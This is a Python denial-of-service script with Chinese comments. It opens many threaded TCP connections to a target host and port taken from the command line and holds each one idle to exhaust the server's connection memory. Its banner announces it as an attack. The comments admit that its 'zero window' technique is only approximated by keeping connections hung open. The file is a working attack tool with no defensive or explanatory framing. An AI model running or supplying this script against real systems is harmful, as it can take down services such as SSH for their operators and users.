#!/usr/bin/env python3
import socket
import time
import random
import threading
import sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 200

def tcp_zero_window():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            
            # 关键：设置socket接收缓冲区为0（其实内核最小有1字节），但通过setsockopt模拟窗口为0
            # 更直接：connect成功后，什么都不收，也不发ACK之外的包，让连接处于ESTABLISHED状态
            # 通过发送0字节窗口通告（需要构造TCP头，这里用保持连接挂起替代）
            # 我们直接 Sleep 挂起 30~60秒，不发送任何数据
            time.sleep(random.uniform(20, 60))
            s.close()
        except:
            time.sleep(0.01)

print(f"[+] 发起 TCP 全连接内存耗尽攻击 {target_ip}:{target_port}")
for i in range(threads):
    threading.Thread(target=tcp_zero_window, daemon=True).start()
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] 停止")
